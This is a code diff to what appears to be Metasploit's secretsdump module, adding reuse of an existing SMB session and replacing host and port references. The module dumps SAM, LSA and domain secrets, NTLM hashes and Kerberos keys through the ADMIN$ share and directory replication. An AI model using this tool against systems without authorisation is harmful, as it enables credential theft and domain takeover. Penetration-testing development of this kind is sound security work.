@@ -11,6 +11,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Util::WindowsRegistry
   include Msf::Util::WindowsCryptoHelpers
+  include Msf::OptionalSession
 
   # Mapping of MS-SAMR encryption keys to IANA Kerberos Parameter values
   #
@@ -73,7 +74,8 @@ class MetasploitModule < Msf::Auxiliary
           [ 'LSA', { 'Description' => 'Dump LSA secrets' } ],
           [ 'DOMAIN', { 'Description' => 'Dump domain secrets (credentials, password history, Kerberos keys, etc.)' } ]
         ],
-        'DefaultAction' => 'ALL'
+        'DefaultAction' => 'ALL',
+        'SessionTypes' => %w[SMB]
       )
     )
 
@@ -170,7 +172,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def retrieve_hive(hive_name)
     file_name = save_registry_key(hive_name)
-    tree2 = simple.client.tree_connect("\\\\#{sock.peerhost}\\ADMIN$")
+    tree2 = simple.client.tree_connect("\\\\#{simple.address}\\ADMIN$")
     file = tree2.open_file(filename: "Temp\\#{file_name}", delete: true, read: true)
     file.read
   ensure
@@ -193,8 +195,8 @@ class MetasploitModule < Msf::Auxiliary
     user, hash, type: :ntlm_hash, jtr_format: '', realm_key: nil, realm_value: nil
   )
     service_data = {
-      address: rhost,
-      port: rport,
+      address: simple.address,
+      port: simple.port,
       service_name: 'smb',
       protocol: 'tcp',
       workspace_id: myworkspace_id
@@ -216,8 +218,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def report_info(data, type = '')
     report_note(
-      host: rhost,
-      port: rport,
+      host: simple.address,
+      port: simple.port,
       proto: 'tcp',
       sname: 'smb',
       type: type,
@@ -629,7 +631,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def connect_drs
     dcerpc_client = RubySMB::Dcerpc::Client.new(
-      rhost,
+      simple.address,
       RubySMB::Dcerpc::Drsr,
       username: datastore['SMBUser'],
       password: datastore['SMBPass']
@@ -1014,7 +1016,7 @@ class MetasploitModule < Msf::Auxiliary
     @svcctl.bind(endpoint: RubySMB::Dcerpc::Svcctl)
     vprint_good('Bound to \\svcctl')
 
-    @svcctl.open_sc_manager_w(sock.peerhost)
+    @svcctl.open_sc_manager_w(simple.address)
   end
 
   def run
@@ -1022,16 +1024,23 @@ class MetasploitModule < Msf::Auxiliary
       print_warning('Cannot find any active database. Extracted data will only be displayed here and NOT stored.')
     end
 
-    connect
-    begin
-      smb_login
-    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
-      fail_with(Module::Failure::NoAccess,
-                "Unable to authenticate ([#{e.class}] #{e}).")
+    if session
+      print_status("Using existing session #{session.sid}")
+      client = session.client
+      self.simple = ::Rex::Proto::SMB::SimpleClient.new(client.dispatcher.tcp_socket, client: client)
+      simple.connect("\\\\#{simple.address}\\IPC$") # smb_login connects to this share for some reason and it doesn't work unless we do too
+    else
+      connect
+      begin
+        smb_login
+      rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
+        fail_with(Module::Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
+      end
     end
+
     report_service(
-      host: rhost,
-      port: rport,
+      host: simple.address,
+      port: simple.port,
       host_name: simple.client.default_name,
       proto: 'tcp',
       name: 'smb',
@@ -1039,7 +1048,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     begin
-      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
+      @tree = simple.client.tree_connect("\\\\#{simple.address}\\IPC$")
     rescue RubySMB::Error::RubySMBError => e
       fail_with(Module::Failure::Unreachable,
                 "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
